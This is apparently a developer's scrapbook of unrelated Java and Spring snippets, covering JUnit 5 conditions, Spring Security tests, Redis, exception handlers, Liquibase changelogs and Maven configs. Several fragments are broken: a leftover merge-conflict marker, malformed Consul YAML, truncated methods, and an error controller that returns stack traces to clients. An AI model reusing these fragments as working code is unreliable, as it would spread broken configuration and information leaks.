    @Email(message = "{model.domain.mail-message.to.notValid}")
    @NotBlank(message = "{model.domain.mail-message.to.notBlank}")
    private String to;

    /**
     * Optional email address or list of addresses to Carbon Copy record.
     */
    @Valid
    @JsonProperty(CC_FIELD_NAME)
    @JsonFormat(with = JsonFormat.Feature.ACCEPT_SINGLE_VALUE_AS_ARRAY)
    @NullOrNotEmpty(message = "{model.domain.mail-message.cc.nullOrNotEmpty}")
    private List<@Email @NotBlank String> cc;

    /**
     * Optional email address or list of addresses to Blind Carbon Copy record.
     */
    @Valid
    @JsonProperty(BCC_FIELD_NAME)
    @JsonFormat(with = JsonFormat.Feature.ACCEPT_SINGLE_VALUE_AS_ARRAY)
    @NullOrNotEmpty(message = "{model.domain.mail-message.bcc.nullOrNotEmpty}")
    private List<@Email @NotBlank String> bcc;

    /**
     * Subject of the record.
     */
    @JsonProperty(SUBJECT_FIELD_NAME)
    private String subject;

    /**
     * Content of the record.
     */
    @JsonProperty(TEXT_FIELD_NAME)
    private String text;

    /**
     * Does record contain HTML or plain text.
     */
    @JsonProperty(IS_HTML_FIELD_NAME)
    private boolean isHtml;

    /**
     * Optional attachment or list of attachments. See {@link MailMessageAttachment}
     */
    @Valid
    @JsonProperty(ATTACHMENTS_FIELD_NAME)
    @JsonFormat(with = JsonFormat.Feature.ACCEPT_SINGLE_VALUE_AS_ARRAY)
    @NullOrNotEmpty(message = "{model.domain.mail-message.attachments.nullOrNotEmpty}")
    private List<@NotNull MailMessageAttachment> attachments;

    @UtilityClass
    static final class Info {
        /**
         * Default model DTO name
         */
        static final String MODEL_DTO_NAME = "MailMessage";
        /**
         * Default field names
         */
        static final String FROM_FIELD_NAME = "from";
        static final String TO_FIELD_NAME = "to";
        static final String CC_FIELD_NAME = "cc";
        static final String BCC_FIELD_NAME = "bcc";
        static final String SUBJECT_FIELD_NAME = "subject";
        static final String TEXT_FIELD_NAME = "text";
        static final String IS_HTML_FIELD_NAME = "isHtml";
        static final String ATTACHMENTS_FIELD_NAME = "attachments";
    }
}


package com.paragon.microservices.mailer.model.domain;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.annotation.JsonRootName;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.experimental.UtilityClass;
import org.springframework.core.io.InputStreamSource;
import org.springframework.validation.annotation.Validated;

import javax.validation.constraints.NotBlank;
import javax.validation.constraints.NotNull;

import static com.paragon.microservices.mailer.model.domain.MailMessageAttachment.Info.*;

@Data
@Builder
@Validated
@NoArgsConstructor
@AllArgsConstructor
@JsonIgnoreProperties(ignoreUnknown = true)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
@JsonRootName(value = MODEL_DTO_NAME, namespace = "mailer")
public class MailMessageAttachment {
    /**
     * Name of the attachment.
     */
    @JsonProperty(NAME_FIELD_NAME)
    @NotBlank(message = "{model.domain.mail-message-attachment.name.notBlank}")
    private String name;

    /**
     * Optional MIME-type of the attachment.
     */
    @JsonProperty(MIME_TYPE_FIELD_NAME)
    @NotBlank(message = "{model.domain.mail-message-attachment.mime-type.notBlank}")
    private String mimeType;

    @JsonProperty(CONTENT_FIELD_NAME)
    @NotNull(message = "{model.domain.mail-message-attachment.content.notNull}")
    private InputStreamSource content;

    @UtilityClass
    static final class Info {
        /**
         * Default model DTO name
         */
        static final String MODEL_DTO_NAME = "MailMessageAttachment";
        /**
         * Default field names
         */
        static final String NAME_FIELD_NAME = "name";
        static final String MIME_TYPE_FIELD_NAME = "mimeType";
        static final String CONTENT_FIELD_NAME = "content";
    }
}
--------------------------------------------------------------------------------------------------------
import org.junit.Ignore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.migrationsupport.EnableJUnit4MigrationSupport;

// @ExtendWith(IgnoreCondition.class)
@EnableJUnit4MigrationSupport
class IgnoredTestsDemo {

    @Ignore
    @Test
    void testWillBeIgnored() {
    }

    @Test
    void testWillBeExecuted() {
    }
}
--------------------------------------------------------------------------------------------------------

    @RegisterExtension
    static WebServerExtension server = WebServerExtension.builder()
        .enableSecurity(false)
        .build();

    @Test
    void getProductList() {
        WebClient webClient = new WebClient();
        String serverUrl = server.getServerUrl();
        // Use WebClient to connect to web server using serverUrl and verify response
        assertEquals(200, webClient.get(serverUrl + "/products").getResponseStatus());
    }

}
--------------------------------------------------------------------------------------------------------
// Register handlers for @Test, @BeforeEach, @AfterEach as well as @BeforeAll and @AfterAll
@ExtendWith(ThirdExecutedHandler.class)
class MultipleHandlersTestCase {

    // Register handlers for @Test, @BeforeEach, @AfterEach only
    @ExtendWith(SecondExecutedHandler.class)
    @ExtendWith(FirstExecutedHandler.class)
    @Test
    void testMethod() {
    }

}
--------------------------------------------------------------------------------------------------------
@Test
@EnabledOnOs(MAC)
void onlyOnMacOs() {
    // ...
}

@TestOnMac
void testOnMac() {
    // ...
}

@Test
@EnabledOnOs({ LINUX, MAC })
void onLinuxOrMac() {
    // ...
}

@Test
@DisabledOnOs(WINDOWS)
void notOnWindows() {
    // ...
}

@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
@Test
@EnabledOnOs(MAC)
@interface TestOnMac {
}

@Test
@EnabledOnJre(JAVA_8)
void onlyOnJava8() {
    // ...
}

@Test
@EnabledOnJre({ JAVA_9, JAVA_10 })
void onJava9Or10() {
    // ...
}

@Test
@EnabledForJreRange(min = JAVA_9, max = JAVA_11)
void fromJava9to11() {
    // ...
}

@Test
@EnabledForJreRange(min = JAVA_9)
void fromJava9toCurrentJavaFeatureNumber() {
    // ...
}

@Test
@EnabledForJreRange(max = JAVA_11)
void fromJava8To11() {
    // ...
}

@Test
@DisabledOnJre(JAVA_9)
void notOnJava9() {
    // ...
}

@Test
@DisabledForJreRange(min = JAVA_9, max = JAVA_11)
void notFromJava9to11() {
    // ...
}

@Test
@DisabledForJreRange(min = JAVA_9)
void notFromJava9toCurrentJavaFeatureNumber() {
    // ...
}

@Test
@DisabledForJreRange(max = JAVA_11)
void notFromJava8to11() {
    // ...
}


@Test
@EnabledOnJre(JAVA_8)
void onlyOnJava8() {
    // ...
}

@Test
@EnabledOnJre({ JAVA_9, JAVA_10 })
void onJava9Or10() {
    // ...
}

@Test
@EnabledForJreRange(min = JAVA_9, max = JAVA_11)
void fromJava9to11() {
    // ...
}

@Test
@EnabledForJreRange(min = JAVA_9)
void fromJava9toCurrentJavaFeatureNumber() {
    // ...
}

@Test
@EnabledForJreRange(max = JAVA_11)
void fromJava8To11() {
    // ...
}

@Test
@DisabledOnJre(JAVA_9)
void notOnJava9() {
    // ...
}

@Test
@DisabledForJreRange(min = JAVA_9, max = JAVA_11)
void notFromJava9to11() {
    // ...
}

@Test
@DisabledForJreRange(min = JAVA_9)
void notFromJava9toCurrentJavaFeatureNumber() {
    // ...
}

@Test
@DisabledForJreRange(max = JAVA_11)
void notFromJava8to11() {
    // ...
}

https://junit.org/junit5/docs/snapshot/user-guide/


@Test
@EnabledIfSystemProperty(named = "os.arch", matches = ".*64.*")
void onlyOn64BitArchitectures() {
    // ...
}

@Test
@DisabledIfSystemProperty(named = "ci-server", matches = "true")
void notOnCiServer() {



@Test
@EnabledIfEnvironmentVariable(named = "ENV", matches = "staging-server")
void onlyOnStagingServer() {
    // ...
}

@Test
@DisabledIfEnvironmentVariable(named = "ENV", matches = ".*development.*")
void notOnDeveloperWorkstation() {
    // ...
}



--------------------------------------------------------------------------------------------------------
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.Test;
import org.springframework.mock.web.MockHttpSession;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;

import eu.ubicon.webapp.test.WebappTestEnvironment;

public class Test extends WebappTestEnvironment {

    public static class MockSecurityContext implements SecurityContext {

        private static final long serialVersionUID = -1386535243513362694L;

        private Authentication authentication;

        public MockSecurityContext(Authentication authentication) {
            this.authentication = authentication;
        }

        @Override
        public Authentication getAuthentication() {
            return this.authentication;
        }

        @Override
        public void setAuthentication(Authentication authentication) {
            this.authentication = authentication;
        }
    }

    @Test
    public void signedIn() throws Exception {

        UsernamePasswordAuthenticationToken principal = 
                this.getPrincipal("test1");

        MockHttpSession session = new MockHttpSession();
        session.setAttribute(
                HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY, 
                new MockSecurityContext(principal));


        super.mockMvc
            .perform(
                    get("/api/v1/resource/test")
                    .session(session))
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Bean
	public RedisConnectionFactory redisConnectionFactory() {
		RedisStandaloneConfiguration configuration = new RedisStandaloneConfiguration("127.0.0.1", 6379);
		LettuceConnectionFactory lettuceConnectionFactory = new LettuceConnectionFactory(configuration);
		return lettuceConnectionFactory;
	}

@Bean
	public RedisTemplate<String, Bean> redisTemplate(RedisConnectionFactory connectionFactory) {
		RedisTemplate<String, Bean> redisTemplate = new RedisTemplate<>();
		redisTemplate.setConnectionFactory(connectionFactory);
		return redisTemplate;
	}

@Bean
	public Subscription listener(TestStreamListener streamListener, RedisConnectionFactory redisConnectionFactory)
			throws InterruptedException {
		StreamMessageListenerContainerOptions<String, ObjectRecord<String, String>> containerOptions = StreamMessageListenerContainerOptions
				.builder().serializer(RedisSerializer.string()).errorHandler(e -> e.printStackTrace())
				.keySerializer(RedisSerializer.string()).targetType(String.class).build();

		StreamMessageListenerContainer<String, ObjectRecord<String, String>> container = StreamMessageListenerContainer
				.create(redisConnectionFactory, containerOptions);

		Subscription subscription = container.receive(Consumer.from("group-1", "consumer-1"),
				StreamOffset.fromStart("streamx"), a -> {
					System.out.println(a.getValue());
				});
		container.start();
		while (!subscription.isActive())
			;
		System.out.println("The subscriber is active: "+subscription.isActive());
		return subscription;
	}
--------------------------------------------------------------------------------------------------------
@Component
class JsonAuthenticationFilter extends AbstractAuthenticationProcessingFilter {


    private static final RequestMatcher MATCHER = new AndRequestMatcher( Arrays.asList(
        new AntPathRequestMatcher( Routes.AUTH_PASS, HttpMethod.POST.name() ),
        new MediaTypeRequestMatcher( new ContentTypeContentNegotiationStrategy(),
            MediaType.APPLICATION_JSON, MediaType.APPLICATION_JSON_UTF8 )
    ) );

    private final ObjectMapper objectMapper;
    private final Validator validator;

    protected JsonAuthenticationFilter( ObjectMapper objectMapper, Validator validator ) {
        super( MATCHER );
        this.objectMapper = objectMapper;
        this.validator = validator;
    }

    @Override
    public Authentication attemptAuthentication( HttpServletRequest request, HttpServletResponse response )
        throws AuthenticationException, IOException {

        PasswordCredential credentials = objectMapper.readValue( request.getReader(), PasswordCredential.class );

        try {
            DataBinder dataBinder = new DataBinder( credentials );
            dataBinder.setBindingErrorProcessor( new DefaultBindingErrorProcessor() );
            dataBinder.setValidator( validator );
            dataBinder.validate();
            dataBinder.close();
        }
        catch ( BindException e ) {
            throw new BadRequestException( "field errors", e );
        }

        AbstractAuthenticationToken authRequest = credentials.toAuthenticationToken();

        setDetails( request, authRequest );

        return this.getAuthenticationManager().authenticate( authRequest );
    }

    private void setDetails( HttpServletRequest request, AbstractAuthenticationToken authRequest ) {
        authRequest.setDetails( authenticationDetailsSource.buildDetails( request ) );
    }

    @Override
    @Autowired( required = false )
    public void setRememberMeServices( RememberMeServices rememberMeServices ) {
        super.setRememberMeServices( rememberMeServices );
    }

    @Override
    @Autowired
    public void setAuthenticationManager( AuthenticationManager authenticationManager ) {
        super.setAuthenticationManager( authenticationManager );
    }
}
--------------------------------------------------------------------------------------------------------
spring.cloud.consul.discovery.heartbeat.enabled: blah2
ribbon.client.name: application2
spring:
  cloud:
    service-registry:
      auto-registration:
        enabled: false
    consul:
      host: localhost
      port: 8500
      config.enabled: false
        ribbon:
      enabled: true
        discovery:
          register: false
          heartbeat:
#                    enabled: true
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.EntityStates;
import com.haulmont.cuba.core.global.Metadata;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.validation.Path;
import javax.validation.TraversableResolver;
import java.lang.annotation.ElementType;

public class CubaValidationTraversableResolver implements TraversableResolver {

    private static final Logger log = LoggerFactory.getLogger(CubaValidationTraversableResolver.class);

    protected Metadata metadata;
    protected EntityStates entityStates;

    public CubaValidationTraversableResolver(Metadata metadata, EntityStates entityStates) {
        this.metadata = metadata;
        this.entityStates = entityStates;
    }

    @Override
    public final boolean isReachable(Object traversableObject,
                                     Path.Node traversableProperty,
                                     Class<?> rootBeanType,
                                     Path pathToTraversableObject,
                                     ElementType elementType) {
        log.trace("Calling isReachable on object {} with node name {}",
                traversableObject, traversableProperty.getName());

        if (traversableObject == null
                || metadata.getClass(traversableObject.getClass()) == null) {
            return true;
        }

        return entityStates.isLoaded(traversableObject, traversableProperty.getName());
    }

    @Override
    public boolean isCascadable(Object traversableObject, Path.Node traversableProperty, Class<?> rootBeanType,
                                Path pathToTraversableObject, ElementType elementType) {
        // return true as org.hibernate.validator.internal.engine.resolver.JPATraversableResolver does
        return true;
    }
}
--------------------------------------------------------------------------------------------------------
RedisCluster.builder()
                .sentinelPorts(redisSentinels) //btw, order counts here, if you set ports after setting replication groups
                .serverPorts(redisHosts) //you will get different ports. Go figure
                .withServerBuilder(new CustomClusterRedisServerBuilder().setting("maxmemory 128").setting("maxheap 128M")) //same goes for settings
                .withSentinelBuilder(RedisSentinel.builder().setting("maxmemory 128").setting("maxheap 128M"))
                .sentinelCount(3)
                .quorumSize(2)
                .replicationGroup("master1", 1)
                .replicationGroup("master2", 1)
                .replicationGroup("master3", 1)
                .build()
--------------------------------------------------------------------------------------------------------
import javax.validation.ClockProvider;
import java.time.Clock;
import java.time.ZonedDateTime;

public class CubaValidationTimeProvider implements ClockProvider {

    protected TimeSource timeSource;

    public CubaValidationTimeProvider(TimeSource timeSource) {
        this.timeSource = timeSource;
    }

    @Override
    public Clock getClock() {
        ZonedDateTime now = timeSource.now();
        return Clock.fixed(now.toInstant(), now.getZone());
    }
}
--------------------------------------------------------------------------------------------------------
mvn <args> -rf :paragon.mailingcontour.commons
--------------------------------------------------------------------------------------------------------
import com.haulmont.cuba.core.global.*;
import com.haulmont.cuba.core.sys.validation.CubaValidationMessagesInterpolator;
import com.haulmont.cuba.core.sys.validation.CubaValidationTimeProvider;
import com.haulmont.cuba.core.sys.validation.CubaValidationTraversableResolver;
import org.hibernate.validator.HibernateValidator;
import org.hibernate.validator.HibernateValidatorConfiguration;
import org.hibernate.validator.cfg.ConstraintMapping;
import org.springframework.stereotype.Component;

import javax.annotation.Nullable;
import javax.inject.Inject;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

import static com.haulmont.bali.util.Preconditions.checkNotNullArgument;

@Component(BeanValidation.NAME)
public class BeanValidationImpl implements BeanValidation {

    public static final ValidationOptions NO_VALIDATION_OPTIONS = new ValidationOptions();

    @Inject
    protected Messages messages;
    @Inject
    protected Metadata metadata;
    @Inject
    protected TimeSource timeSource;
    @Inject
    protected UserSessionSource userSessionSource;
    @Inject
    protected EntityStates entityStates;

    protected ConcurrentHashMap<Locale, ValidatorFactory> validatorFactoriesCache = new ConcurrentHashMap<>();

    @Override
    public Validator getValidator() {
        Locale locale = getCurrentLocale();

        return getValidatorWithDefaultFactory(locale);
    }

    @Override
    public Validator getValidator(ConstraintMapping constraintMapping) {
        checkNotNullArgument(constraintMapping);

        return getValidator(constraintMapping, NO_VALIDATION_OPTIONS);
    }

    @Override
    public Validator getValidator(@Nullable ConstraintMapping constraintMapping, ValidationOptions options) {
        checkNotNullArgument(options);

        if (constraintMapping == null
                && options.getFailFast() == null
                && options.getLocale() != null) {
            return getValidatorWithDefaultFactory(options.getLocale());
        }

        Locale locale;
        if (options.getLocale() != null) {
            locale = options.getLocale();
        } else {
            locale = getCurrentLocale();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        if (options.getFailFast() != null) {
            configuration.failFast(options.getFailFast());
        }
        if (constraintMapping != null) {
            configuration.addMapping(constraintMapping);
        }

        ValidatorFactory factory = configuration.buildValidatorFactory();
        return factory.getValidator();
    }

    protected Validator getValidatorWithDefaultFactory(Locale locale) {
        ValidatorFactory validatorFactoryFromCache = validatorFactoriesCache.get(locale);
        if (validatorFactoryFromCache != null) {
            return validatorFactoryFromCache.getValidator();
        }

        HibernateValidatorConfiguration configuration = getValidatorFactoryConfiguration(locale);
        ValidatorFactory factory = configuration.buildValidatorFactory();

        validatorFactoriesCache.put(locale, factory);

        return factory.getValidator();
    }

    protected HibernateValidatorConfiguration getValidatorFactoryConfiguration(Locale locale) {
        @SuppressWarnings("UnnecessaryLocalVariable")
        HibernateValidatorConfiguration configuration = Validation.byProvider(HibernateValidator.class)
                .configure()
                .clockProvider(new CubaValidationTimeProvider(timeSource))
                .traversableResolver(new CubaValidationTraversableResolver(metadata, entityStates))
                .messageInterpolator(new CubaValidationMessagesInterpolator(messages, locale));

        return configuration;
    }

    protected Locale getCurrentLocale() {
        Locale locale;
        if (userSessionSource.checkCurrentUserSession()) {
            locale = userSessionSource.getLocale();
        } else {
            locale = messages.getTools().getDefaultLocale();
        }
        return locale;
    }
}
=======
LinkedMultiValueMap<String, Object> map = new LinkedMultiValueMap<>();
map.add("file", new ClassPathResource(file));
HttpHeaders headers = new HttpHeaders();
headers.setContentType(MediaType.MULTIPART_FORM_DATA);

HttpEntity<LinkedMultiValueMap<String, Object>> requestEntity = new    HttpEntity<LinkedMultiValueMap<String, Object>>(
                    map, headers);
ResponseEntity<String> result = template.get().exchange(
                    contextPath.get() + path, HttpMethod.POST, requestEntity,
                    String.class);
>>>>>>> b494d6cea61253f648b912ce216862387070907c
--------------------------------------------------------------------------------------------------------
public class ApiError {

    private int code;
    private String message;
    private Instant timestamp;

    public ApiError(int code, String message) {
        this.code = code;
        this.message = message;
        this.timestamp = Instant.now();
    }

    public ApiError(int code, String message, Instant timestamp) {
        this.code = code;
        this.message = message;
        this.timestamp = timestamp;
    }

    // Getters and setters here...
}

For REST controllers, I would recommend to use Zalando Problem Spring Web.

https://github.com/zalando/problem-spring-web

If Spring Boot aims to embed some auto-configuration, this library does more for exception handling. You just need to add the dependency:

<dependency>
    <groupId>org.zalando</groupId>
    <artifactId>problem-spring-web</artifactId>
    <version>LATEST</version>
</dependency>
And then define one or more advice traits for your exceptions (or use those provided by default)

public interface NotAcceptableAdviceTrait extends AdviceTrait {

    @ExceptionHandler
    default ResponseEntity<Problem> handleMediaTypeNotAcceptable(
            final HttpMediaTypeNotAcceptableException exception,
            final NativeWebRequest request) {
        return Responses.create(Status.NOT_ACCEPTABLE, exception, request);
    }

}
Then you can defined the controller advice for exception handling as:

@ControllerAdvice
class ExceptionHandling implements MethodNotAllowedAdviceTrait, NotAcceptableAdviceTrait {

}
--------------------------------------------------------------------------------------------------------
@Controller
@ControllerAdvice
public class ExceptionHandlerController {

    @ExceptionHandler(Exception.class)
    public ModelAndView exceptionHandler(HttpServletRequest request, HttpServletResponse response, Exception ex) {
        //If exception has a ResponseStatus annotation then use its response code
        ResponseStatus responseStatusAnnotation = AnnotationUtils.findAnnotation(ex.getClass(), ResponseStatus.class);

        return buildModelAndViewErrorPage(request, response, ex, responseStatusAnnotation != null ? responseStatusAnnotation.value() : HttpStatus.INTERNAL_SERVER_ERROR);
    }

    @RequestMapping("*")
    public ModelAndView fallbackHandler(HttpServletRequest request, HttpServletResponse response) throws Exception {
        return buildModelAndViewErrorPage(request, response, null, HttpStatus.NOT_FOUND);
    }

    private ModelAndView buildModelAndViewErrorPage(HttpServletRequest request, HttpServletResponse response, Exception ex, HttpStatus httpStatus) {
        response.setStatus(httpStatus.value());

        ModelAndView mav = new ModelAndView("error.html");
        if (ex != null) {
            mav.addObject("title", ex);
        }
        mav.addObject("content", request.getRequestURL());
        return mav;
    }
}

@EnableWebMvc
@ControllerAdvice
public class ServiceExceptionHandler extends ResponseEntityExceptionHandler {

    @ExceptionHandler(Throwable.class)
    @ResponseBody
    ResponseEntity<Object> handleControllerException(HttpServletRequest req, Throwable ex) {
        ErrorResponse errorResponse = new ErrorResponse(ex);
        if(ex instanceof ServiceException) {
            errorResponse.setDetails(((ServiceException)ex).getDetails());
        }
        if(ex instanceof ServiceHttpException) {
            return new ResponseEntity<Object>(errorResponse,((ServiceHttpException)ex).getStatus());
        } else {
            return new ResponseEntity<Object>(errorResponse,HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }

    @Override
    protected ResponseEntity<Object> handleNoHandlerFoundException(NoHandlerFoundException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        Map<String,String> responseBody = new HashMap<>();
        responseBody.put("path",request.getContextPath());
        responseBody.put("message","The URL you have reached is not in service at this time (404).");
        return new ResponseEntity<Object>(responseBody,HttpStatus.NOT_FOUND);
    }
    ...
}
--------------------------------------------------------------------------------------------------------
mvn -Dmaven.test.skip -U clean package
--------------------------------------------------------------------------------------------------------
import java.util.Map;
import javax.servlet.RequestDispatcher;
import javax.servlet.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.servlet.error.ErrorAttributes;
import org.springframework.boot.web.servlet.error.ErrorController;
import org.springframework.stereotype.Controller;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.request.WebRequest;

@Controller
public class CustomErrorController implements ErrorController {

    // ErrorAttributes object is used to save all error attributes value.
    private final ErrorAttributes errorAttributes;

    @Autowired
    public CustomErrorController(ErrorAttributes errorAttributes) {
        Assert.notNull(errorAttributes, "ErrorAttributes must not be null");
        this.errorAttributes = errorAttributes;
    }

    /* Return the error page path. */
    @Override
    public String getErrorPath() {
        return "/error";
    }

    // Handle the /error path invoke.
    @RequestMapping("/error")
   /* @ResponseBody annotation will return the error page content instead of the template error page name. */
    @ResponseBody
    public String processError(HttpServletRequest request, WebRequest webRequest) {

        // Get error status code.
        Integer statusCode = (Integer)request.getAttribute(RequestDispatcher.ERROR_STATUS_CODE);

        if(statusCode.intValue() == 500)
        {
            // If you want to return template error page, then remove the @ResponseBody annotation of this method.
            return "error-500.html";
        }else
        {
            // Get error message.
            String message = (String)request.getAttribute(RequestDispatcher.ERROR_MESSAGE);

            // Get exception object.
            Exception exception = (Exception)request.getAttribute(RequestDispatcher.ERROR_EXCEPTION);

            // Get error stack trace map object. 
            Map<String, Object> body = errorAttributes.getErrorAttributes(webRequest, true);
            // Extract stack trace string.
            String trace = (String) body.get("trace");

            StringBuffer retBuf = new StringBuffer();
            retBuf.append("<pre>");

            if(statusCode != null)
            {
                retBuf.append("Status Code : ");
                retBuf.append(statusCode);
            }

            if(message != null && message.trim().length() > 0)
            {
                retBuf.append("\n\rError Message : ");
                retBuf.append(message);
            }

            if(trace != null){
                retBuf.append("\n\rStack Trace : ");
                retBuf.append(trace);
            }

            retBuf.append("</pre>");

            return retBuf.toString();
        }

    }
}
--------------------------------------------------------------------------------------------------------
2
3
4
List<String> filteredList = listOfOptionals.stream()
  .filter(Optional::isPresent)
  .map(Optional::get)
  .collect(Collectors.toList());
3. Using flatMap()
The other option would be to use flatMap with a lambda expression that converts an empty Optional to an empty Stream instance, and non-empty Optional to a Stream instance containing only one element:

1
2
3
List<String> filteredList = listOfOptionals.stream()
  .flatMap(o -> o.isPresent() ? Stream.of(o.get()) : Stream.empty())
  .collect(Collectors.toList());
Alternatively, you could apply the same approach using a different way of converting an Optional to Stream:

1
2
3
List<String> filteredList = listOfOptionals.stream()
  .flatMap(o -> o.map(Stream::of).orElseGet(Stream::empty))
  .collect(Collectors.toList());
--------------------------------------------------------------------------------------------------------
testImplementation('org.springframework.boot:spring-boot-starter-test') {
    exclude group: 'org.hamcrest', module: 'hamcrest-core'
    exclude group: 'org.skyscreamer', module: 'jsonassert'
}
--------------------------------------------------------------------------------------------------------
@Query("select case when count(c)> 0 then true else false end from Car c where lower(c.model) like lower(:model)")
boolean existsCarLikeCustomQuery(@Param("model") String model);
--------------------------------------------------------------------------------------------------------
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>3.7.0</version>
<configuration>
<source>11</source>
<target>11</target>
<compilerArgs>
<arg>--add-modules</arg>>
<arg>org.openqa.selenium.remote</arg>
<arg>--patch-module</arg>
<arg>org.openqa.selenium.remote=C:\Users\soapui\.m2\repository\org\hamcrest\hamcrest-all\1.3\hamcrest-all-1.3.jar</arg>
</compilerArgs>
</configuration>
</plugin>
--------------------------------------------------------------------------------------------------------
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>3.7.0</version>
<configuration>
<source>11</source>
<target>11</target>
<excludes>
<exclude>javax.xml.stream</exclude>
<exclude>stax</exclude>
</excludes>
</configuration>
</plugin>
--------------------------------------------------------------------------------------------------------
@SpringBootApplication(exclude = ErrorMvcAutoConfiguration.class )
--------------------------------------------------------------------------------------------------------
In Java 11 the java.nio.file.Files class was extended by two new utility methods to write a string into a file. The first method (see JavaDoc here) uses the charset UTF-8 as default:

Files.writeString(Path.of("my", "path"), "My String");
And the second method (see JavaDoc here) allows to specify an individual charset:

Files.writeString(Path.of("my", "path"), "My String", StandardCharset.ISO_8859_1);
Both methods have an optional Varargs parameter for setting file handling options (see JavaDoc here). The following example would create a non-existing file or append the string to an existing one:

Files.writeString(Path.of("my", "path"), "String to append", StandardOpenOption.CREATE, StandardOpenOption.APPEND);
--------------------------------------------------------------------------------------------------------
import java.util.*;
import java.text.*;


public class Available {
    static public void main(String[] args) {
        Locale list[] = DateFormat.getAvailableLocales();
        for (Locale aLocale : list) {
            System.out.println("INSERT INTO locales(id, locale_name, row_version, created, created_by) VALUES ('" + UUID.randomUUID() + "', '" + aLocale.toString() + "', 0, '2019-08-26T12:39:16+00:00', '{\"userId\":\"ee9cb324-1781-4bb6-6131-08d727c2cbb2\",\"ownerId\":\"b3a341c7-43d0-41b9-af35-cb4cf3b13476\"}')");
        }
    }
}

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;
import java.text.*;

public class Available {
    static public void main(String[] args) throws IOException {
        final Locale list[] = DateFormat.getAvailableLocales();
        final BufferedWriter writer = new BufferedWriter(new FileWriter("test.sql"));
        for (Locale aLocale : list) {
            writer.write("- sql: \"INSERT INTO locales(id, locale_name, row_version, created, created_by) VALUES ('" + UUID.randomUUID() + "', '" + aLocale.toString() + "', 0, '2019-08-26T12:39:16+00:00', '{\"userId\":\"ee9cb324-1781-4bb6-6131-08d727c2cbb2\",\"ownerId\":\"b3a341c7-43d0-41b9-af35-cb4cf3b13476\"}')\"");
        }
    }
}

package com.paragon.microservices.distributor.service.impl;

import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.util.Locale;
import java.util.UUID;

public class Available {
    static public void main(String[] args) throws IOException {
        final Locale list[] = DateFormat.getAvailableLocales();
        final FileWriter writer = new FileWriter("test.sql");
        for (final Locale aLocale : list) {
            writer.write("- sql: \"INSERT INTO locales(id, locale_name, row_version, created, created_by) VALUES ('" + UUID.randomUUID() + "', '" + aLocale.toString() + "', 0, '2019-08-26T12:39:16+00:00', '{\\\"userId\\\":\\\"ee9cb324-1781-4bb6-6131-08d727c2cbb2\\\",\\\"ownerId\\\":\\\"b3a341c7-43d0-41b9-af35-cb4cf3b13476\\\"}')\"\r\n");
        }
        writer.flush();
        writer.close();
    }
}
--------------------------------------------------------------------------------------------------------
databaseChangeLog:
  - changeSet:
      id: 1
      author: pazfernando
      preConditions:
        - onFail: MARK_RAN
        - tableExists:
            schemaName: sa
            tableName: PROVEEDORBIENSERVICIO
      changes:
        - renameTable:
            newTableName: PROVEEDORBIENSERVICIO
            oldTableName: PROVEEDORSERVICIO
            schemaName: sa
			
<changeSet author="asdf" id="1234">
    <sql dbms="h2" endDelimiter=";">
        CREATE SCHEMA schema
    </sql>
</changeSet>

databaseChangeLog:
- changeSet:
    id: changeSet-id
    author: myName
    preConditions:
      - onFail: MARK_RAN
      - sqlCheck:
          expectedResult: 1
          sql: "select count(*) from foo where some-condition"
    changes:
      - sql: "your sql script"
	  
changeSet:
  id: addColumn-example
  author: francis
  preConditions:
    - columnExist:
      schemaName: earls
      tableName: category
      columnName: display_name                    
  changes:
    - addColumn:
      columns:
        - column:
          name: display_name
          type: varchar(100)
		  
<changeSet id="addColumn-example">
  <preConditions onFail="MARK_RAN">
     <columnExists schemaName="earls" 
           tableName="category" columnName="display_name"/>
  </preConditions>
  <dropColumn columnName="display_name" schemaName="earls" tableName="category"/>
</changeSet>

databaseChangeLog:
  - changeSet:
      id: 1
      author: mraible
      preConditions:
        onFail: MARK_RAN
        not:
          sequenceExists:
            schemaName: public
            sequenceName: hibernate_sequence
      changes:
      - createSequence:
          sequenceName: hibernate_sequence
--------------------------------------------------------------------------------------------------------
@Bean
public Docket api() {
    return new Docket(DocumentationType.SWAGGER_2)
            .select()
            .apis(RequestHandlerSelectors.any())
            .paths(paths())
            .build().apiInfo(metadata());
}

private Predicate<String> paths() {
    return or(
            regex("/firstContext.*"),
            regex("/secondContext.*"));
}

private ApiInfo metadata() {
    return new ApiInfoBuilder()
            .title("SomeTitle")
            .description("SomeDescription")
            .build();
}


// Only select apis that matches the given Predicates.
private Predicate<String> paths() {
// Match all paths except /error
    return Predicates.and(
    PathSelectors.regex("/customer.*"),
